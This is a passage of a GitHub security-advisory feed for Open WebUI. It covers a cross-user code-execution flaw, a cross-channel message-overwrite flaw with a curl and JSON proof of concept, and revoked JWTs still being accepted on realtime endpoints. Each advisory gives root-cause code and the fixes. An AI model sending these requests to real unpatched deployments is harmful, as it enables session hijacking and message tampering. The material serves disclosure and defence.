<li><a href="https://github.com/open-webui/open-webui/commit/b7626f05fb92b24ab923ad81a037071ebd5623d1">https://github.com/open-webui/open-webui/commit/b7626f05fb92b24ab923ad81a037071ebd5623d1</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-7r7x-gjvr-448g">https://github.com/advisories/GHSA-7r7x-gjvr-448g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7r7x-gjvr-448g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-24T17:02:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Cross-user code-interpreter and tool execution via unvalidated Socket.IO event-caller session_id]]></title>
        <id>https://github.com/advisories/GHSA-74h3-cxq7-vc5q</id>
        <link href="https://github.com/advisories/GHSA-74h3-cxq7-vc5q"/>
        <updated>2026-07-24T17:01:54.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>An authenticated low-privilege user can execute arbitrary code-interpreter Python and tools inside <strong>another</strong> user's authenticated session. The Socket.IO event-caller (<code>get_event_call</code>) delivers <code>execute:python</code> / <code>execute:tool</code> events to a <strong>client-supplied</strong> <code>session_id</code> after only checking that the session is connected, never that it belongs to the requester. Combined with <code>ydoc:document:join</code>, which exposes the live socket ids of everyone in a shared note's collaboration room to any read-access participant, an attacker can target a victim's session and run attacker-chosen code/tools in the victim's browser context. When the victim is an administrator, that hijacked context reaches the admin-only Functions API, whose source is executed server-side, yielding remote code execution as the server process (root in the default container).</p>
<h2 id="affected-component">Affected component</h2>
<ul>
<li><code>backend/open_webui/socket/main.py</code> — <code>get_event_call()</code> / <code>__event_caller__</code></li>
<li><code>backend/open_webui/main.py</code> — chat-completion metadata (<code>session_id</code> taken from the request body)</li>
</ul>
<h2 id="root-cause">Root cause</h2>
<p>The event-caller routes to a caller-controlled session id with no ownership check:</p>
<pre><code class="language-python"># backend/open_webui/socket/main.py — get_event_call()
async def __event_caller__(event_data):
    session_id = request_info['session_id']
    if session_id not in SESSION_POOL:                 # only checks the session is connected
        return {'error': 'Client session disconnected.'}
    return await sio.call('events', {...}, to=session_id, ...)   # delivered to that sid
</code></pre>
<p><code>session_id</code> originates from the request body and is never validated against the authenticated user:</p>
<pre><code class="language-python"># backend/open_webui/main.py
metadata = {
    'user_id': user.id,                               # server-derived (trustworthy)
    'session_id': form_data.pop('session_id', None),  # client-controlled
    ...
}
</code></pre>
<p><code>SESSION_POOL[session_id]</code> is the user record of whoever owns that socket. Because the caller checks only membership (<code>in SESSION_POOL</code>), a request carrying another user's <code>session_id</code> causes <code>execute:python</code> / <code>execute:tool</code> to be delivered to that other user's browser.</p>
<h2 id="reachability">Reachability</h2>
<ul>
<li><code>execute:python</code> / <code>execute:tool</code> are emitted from the code-interpreter and tool-call paths (<code>utils/middleware.py</code>, <code>tools/builtin.py</code>), all routed through <code>get_event_call</code>.</li>
<li>The victim's live <code>session_id</code> is disclosed to any read-access participant of a shared note via <code>ydoc:document:join</code>.</li>
<li><code>POST /api/v1/chat/completions</code> requires only <code>get_verified_user</code> (the default user role). The attacker uses their own account and a model / Direct Connection they control to choose the payload.</li>
</ul>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Any victim:</strong> arbitrary code-interpreter Python and tool execution in the victim's authenticated session — the attacker acts with the victim's identity and origin (full session/account compromise).</li>
<li><strong>Admin victim:</strong> the hijacked admin context reaches <code>POST /api/v1/functions/create</code>, whose source is <code>exec()</code>'d server-side → remote code execution as the server process (root in the default container).</li>
</ul>
<p>The Functions API is intended administrator code-execution; the vulnerability here is the cross-user delivery that lets an attacker drive another user's session — including an admin's — into it. The primitive is a full session compromise even against non-admin victims.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>The reporter's <code>exploit.py</code> reproduced on <code>ghcr.io/open-webui/open-webui:0.9.6</code> and a build of the <code>v0.9.6</code> tag, confirming blind server-side RCE out-of-band (callback returns <code>uid=0(root)</code>), using only a low-privilege <code>user</code> account that shared a note with an admin victim. Preconditions: code interpreter enabled; attacker shares a note with the victim; victim opens it while online; admin victim required for server RCE.</p>
<h2 id="fix">Fix</h2>
<p><code>get_event_call</code> must verify the target session belongs to the requesting user before delivering, not merely that it is connected:</p>
<pre><code class="language-python">session = SESSION_POOL.get(session_id)
if session is None or session.get('id') != request_info.get('user_id'):
    return {'error': 'Client session disconnected.'}
</code></pre>
<p><code>user_id</code> in the request metadata is server-derived from the authenticated user, so it is trustworthy. Restricting <code>ydoc:document:join</code> so it does not disclose other participants' socket ids is recommended as defence-in-depth.</p>
<h2 id="affected--patched">Affected / Patched</h2>
<ul>
<li>Affected: <code>&lt; 0.10.0</code> (last affected release 0.9.6)</li>
<li>Patched: v0.10.0. <code>get_event_call</code> now verifies the target session belongs to the requesting user before delivering (<code>session is None or session.get('id') != request_info.get('user_id')</code>), using the server-derived <code>user_id</code> from the request metadata. The recommended <code>ydoc:document:join</code> sid-disclosure restriction is defence-in-depth and independent of this fix; the ownership check closes the cross-user delivery regardless of whether the victim's sid is known.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-74h3-cxq7-vc5q">https://github.com/open-webui/open-webui/security/advisories/GHSA-74h3-cxq7-vc5q</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59216">https://nvd.nist.gov/vuln/detail/CVE-2026-59216</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/25763">https://github.com/open-webui/open-webui/pull/25763</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/386ac958144dbbbf0aa6e268070d72b681a318aa">https://github.com/open-webui/open-webui/commit/386ac958144dbbbf0aa6e268070d72b681a318aa</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-74h3-cxq7-vc5q">https://github.com/advisories/GHSA-74h3-cxq7-vc5q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-74h3-cxq7-vc5q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T17:01:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Cross-channel message overwrite via chat completion API (single-model and multimodel message_ids)]]></title>
        <id>https://github.com/advisories/GHSA-x2ff-v5v8-m75m</id>
        <link href="https://github.com/advisories/GHSA-x2ff-v5v8-m75m"/>
        <updated>2026-07-24T17:01:08.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Any authenticated user can overwrite the content of a message in a channel they do not belong to (including private and DM channels) by sending a chat completion request with a <code>channel:</code>-prefixed <code>chat_id</code> and a target <code>message_id</code>. The <code>channel:</code> path routes pipeline output through <code>_make_channel_emitter</code>, which writes to the <code>Messages</code> table using the caller-supplied <code>message_id</code> without binding it to the channel.</p>
<p>This advisory consolidates two filings of the same flaw: the original single-model form, and a multimodel <code>message_ids</code> variant that survives the partial fix shipped in v0.9.6 (see "Fix status" below).</p>
<h2 id="details-as-introduced-in-v095">Details (as introduced in v0.9.5)</h2>
<p>When a user submits a chat completion request with a <code>chat_id</code> starting with <code>channel:</code>, three authorization gaps combined in v0.9.5:</p>
<ol>
<li><strong>Ownership check skipped</strong> (<code>main.py</code>): the <code>channel:</code> prefix caused the entire ownership/membership verification block to be skipped, with no channel membership/write check replacing it.</li>
</ol>
<pre><code class="language-python">if not chat_id.startswith('local:') and not chat_id.startswith('channel:'):  # temporary/channel chats are not stored
    if is_new_chat:
        ...
    else:
        if not await Chats.is_chat_owner(chat_id, user.id) and user.role != 'admin':
            raise HTTPException(...)
</code></pre>
<ol start="2">
<li><p><strong>Message ID from user input</strong>: <code>id</code> (and each value of the multimodel <code>message_ids</code> map) comes directly from the request body and is passed as <code>message_id</code> to the channel emitter.</p>
</li>
<li><p><strong>Unchecked database write</strong> (<code>socket/main.py</code> <code>_make_channel_emitter</code>):</p>
</li>
</ol>
<pre><code class="language-python">async def _make_channel_emitter(request_info):
    channel_id = request_info['chat_id'].removeprefix('channel:')
    message_id = request_info['message_id']  # user-supplied
    ...
    await Messages.update_message_by_id(message_id, update_form)  # no channel/user authz
</code></pre>
<p><code>Messages.update_message_by_id</code> performs a direct primary-key update with no <code>channel_id</code>/<code>user_id</code> validation.</p>
<h2 id="fix-shipped-in-v0100">Fix (shipped in v0.10.0)</h2>
<p>v0.9.6 added a channel gate to the <code>channel:</code> branch (PR #24725) that closed the single-model path, but it validated only the first entry of the multimodel <code>message_ids</code> map, leaving the multimodel fan-out exploitable. v0.10.0 closes the remaining gap with two layers:</p>
<ol>
<li><strong>Request-time per-entry validation</strong> (<code>backend/open_webui/main.py</code>): every entry of <code>message_ids</code> is validated against the target channel, not just the first; any entry whose target message does not belong to the channel in <code>chat_id</code> is rejected.</li>
<li><strong>Fail-closed emitter</strong> (<code>backend/open_webui/socket/main.py</code>, <code>_make_channel_emitter</code>): before writing, it re-reads the target message and returns without writing unless <code>msg.channel_id</code> matches the channel derived from <code>chat_id</code>. A missing or mismatched message is a no-op, so a write can no longer land in a channel the caller does not target.</li>
</ol>
<h2 id="poc">PoC</h2>
<p>Single-model (fixed in v0.9.6):</p>
<pre><code class="language-bash">curl -X POST http://target:8080/api/chat/completions \
  -H "Authorization: Bearer $USER_JWT" -H "Content-Type: application/json" \
  -d '{
    "model": "llama3", "stream": true,
    "chat_id": "channel:any-channel-uuid-here",
    "id": "target-message-uuid-to-overwrite",
    "messages": [{"role": "user", "content": "Repeat exactly: This message has been tampered with"}]
  }'
</code></pre>
<p>Multimodel (still works on v0.9.6):</p>
<pre><code class="language-json">POST /api/chat/completions
{
  "chat_id": "channel:&lt;attacker_channel_id&gt;",
  "message_ids": {
    "model-a": "&lt;message_id_in_attacker_channel&gt;",
    "model-b": "&lt;victim_channel_message_id&gt;"
  },
  "messages": [{"role": "user", "content": "..."}]
}
</code></pre>
<p>The first id passes channel scope validation; the second id is used by the per-model fan-out and overwrites the victim-channel message (with model output, or the provider-error string on a deterministic error). Even a failing model call writes error content to the target message.</p>
<h2 id="impact">Impact</h2>
<p><strong>Message integrity destruction:</strong> an authenticated user can overwrite a message in a channel they cannot access, regardless of membership. The overwritten message retains the original author attribution while displaying attacker-chosen content (<strong>impersonation</strong>). Private channels, DM channels, and channels the attacker has no access to are all affected; the REST channel routes correctly return 403 for the same attacker, so the bypass is specific to the chat-completion channel pipeline.</p>
<h2 id="affected-versions">Affected versions</h2>
<ul>
<li>Single-model path: introduced in commit <code>0037baeb2</code> (v0.9.5), fixed in v0.9.6 (#24725).</li>
<li>Multimodel <code>message_ids</code> path: present from v0.9.6, fixed in v0.10.0.</li>
<li>Consolidated Affected: <code>&gt;= 0.9.5, &lt; 0.10.0</code>. Patched: <code>&gt;= 0.10.0</code>.</li>
</ul>
<h2 id="distinction-from-existing-cves">Distinction from existing CVEs</h2>
<p>CVE-2026-45385 (GHSA-wwhq-cx22-f7vv) covered IDOR in the REST endpoint <code>POST /channels/{id}/messages/{message_id}/update</code> (<code>routers/channels.py</code>); its fix (commit <code>f5e110f</code>) only touched <code>channels.py</code>. This finding uses a different code path (<code>POST /api/chat/completions</code> with <code>chat_id: "channel:&lt;id&gt;"</code> → <code>main.py</code> → <code>socket/main.py:_make_channel_emitter</code>), untouched by that fix.</p>
<h2 id="suggested-fix">Suggested fix</h2>
<p>Validate <strong>every</strong> value in <code>message_ids</code> against the channel (not just the first), rejecting any whose target message does not belong to the channel in <code>chat_id</code>. Additionally, make <code>_make_channel_emitter</code> fail closed: re-check that the target message's <code>channel_id</code> matches the channel before calling <code>Messages.update_message_by_id</code>, treating a missing or mismatched message as an error/no-op.</p>
<h2 id="consolidation">Consolidation</h2>
<p>Per Open WebUI's Report Handling policy this advisory consolidates independent reports of the same chat-completions channel-overwrite flaw:</p>
<ul>
<li>Single-model cross-channel overwrite via the <code>channel:</code> path: @sfwani (earliest filing).</li>
<li>Multimodel <code>message_ids</code> fan-out variant that bypasses the v0.9.6 first-id-only gate: @DavidCarliez.</li>
</ul>
<p>One CVE for the consolidated advisory.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-x2ff-v5v8-m75m">https://github.com/open-webui/open-webui/security/advisories/GHSA-x2ff-v5v8-m75m</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/33e4e0dcc43afcca80f9c635d762cdc76c768ba9">https://github.com/open-webui/open-webui/commit/33e4e0dcc43afcca80f9c635d762cdc76c768ba9</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/ac3449cac91e62b08a7c28e54fcd044d14dea791">https://github.com/open-webui/open-webui/commit/ac3449cac91e62b08a7c28e54fcd044d14dea791</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-x2ff-v5v8-m75m">https://github.com/advisories/GHSA-x2ff-v5v8-m75m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x2ff-v5v8-m75m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T17:01:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Realtime endpoints accept Redis-revoked JWTs after signout/backchannel logout]]></title>
        <id>https://github.com/advisories/GHSA-855v-hq7w-jmjw</id>
        <link href="https://github.com/advisories/GHSA-855v-hq7w-jmjw"/>
        <updated>2026-07-24T17:00:13.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>With Redis configured, Open WebUI supports JWT revocation: <code>POST /api/v1/auths/signout</code> (per-token <code>jti</code>) and OIDC back-channel logout (per-user <code>revoked_at</code>) record revocations in Redis, and HTTP auth (<code>get_current_user</code>) rejects revoked tokens with 401. The realtime authentication surfaces do not perform this check: Socket.IO connect / user-join / join-channels / join-note and the terminal websocket first-message auth validate tokens with <code>decode_token()</code> only (signature + expiry). A JWT revoked by sign-out or back-channel logout therefore continues to authenticate new realtime connections, even though the same token is rejected on HTTP.</p>
<h2 id="affected-component">Affected component</h2>
<ul>
<li><code>backend/open_webui/socket/main.py</code> — Socket.IO <code>connect</code>, <code>user-join</code>, <code>join-channels</code>, <code>join-note</code></li>
<li><code>backend/open_webui/routers/terminals.py</code> — terminal websocket first-message auth</li>
<li><code>backend/open_webui/utils/auth.py</code> — the revocation check was applied to HTTP only</li>
</ul>
<h2 id="root-cause">Root cause</h2>
<p>HTTP auth enforces revocation:</p>
<pre><code class="language-python"># utils/auth.py — get_current_user
if data.get('jti') and not await is_valid_token(request, data):
    raise HTTPException(status_code=401, detail='Invalid token')
</code></pre>
<p>Realtime auth calls <code>decode_token()</code> only, which verifies signature + expiry but never consults the Redis revocation keys (<code>{prefix}:auth:token:{jti}:revoked</code>, <code>{prefix}:auth:user:{id}:revoked_at</code>):</p>
<pre><code class="language-python"># socket/main.py — connect / user-join / join-channels / join-note
data = decode_token(auth['token'])
# routers/terminals.py — _resolve_authenticated_connection
data = decode_token(token)
</code></pre>
<h2 id="impact">Impact</h2>
<p>A JWT revoked by user sign-out or OIDC back-channel logout still authenticates new realtime connections. A stolen token therefore retains realtime access after the victim signs out or the IdP performs back-channel logout — the very remediation for a compromised token. The token can populate <code>SESSION_POOL</code> as the victim, join their user/channel/note rooms (receiving realtime channel messages, collaborative-note updates and presence), drive socket-level collaboration as the victim, and pass terminal websocket authentication when terminal servers are configured. HTTP remains correctly protected (401), so REST data and state-changing REST endpoints are not reachable with the revoked token.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Reporter PoC on a Redis-backed deployment (v0.9.6 and main): after <code>POST /api/v1/auths/signout</code>, HTTP returns 401 for the token while a Socket.IO user-join with the same token still authenticates, and the terminal WS reaches terminal-server lookup rather than rejecting it as <code>Invalid token</code>.</p>
<h2 id="fix">Fix</h2>
<p>Apply the revocation check on the realtime paths. The logic is factored into <code>is_token_revoked(redis, decoded)</code> (covering per-token <code>jti</code> and per-user <code>revoked_at</code>); the Socket.IO handlers and the terminal WS reject tokens that fail it, using the main app Redis where revocations are stored. HTTP <code>is_valid_token</code> delegates to the same helper, so HTTP behaviour is unchanged.</p>
<h2 id="affected--patched">Affected / Patched</h2>
<ul>
<li>Affected: <code>&gt;= 0.9.0, &lt; 0.10.0</code>, and only when Redis is configured (without Redis, per-token revocation is not supported and sign-out does not invalidate JWTs by design).</li>
<li>Patched: v0.10.0. The revocation check (<code>is_valid_token</code>, covering per-token <code>jti</code> and per-user <code>revoked_at</code>) is applied on Socket.IO connect / user-join / join-channels / join-note and the terminal websocket first-message auth, using the main app Redis where revocations are stored. HTTP <code>is_valid_token</code> delegates to the same logic, so HTTP behaviour is unchanged.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-855v-hq7w-jmjw">https://github.com/open-webui/open-webui/security/advisories/GHSA-855v-hq7w-jmjw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59219">https://nvd.nist.gov/vuln/detail/CVE-2026-59219</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/33b91bd8ae8a100a5a306c91441a7d0b422c4cde">https://github.com/open-webui/open-webui/commit/33b91bd8ae8a100a5a306c91441a7d0b422c4cde</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-855v-hq7w-jmjw">https://github.com/advisories/GHSA-855v-hq7w-jmjw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-855v-hq7w-jmjw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T17:00:11.000Z</published>
    </entry>
</feed>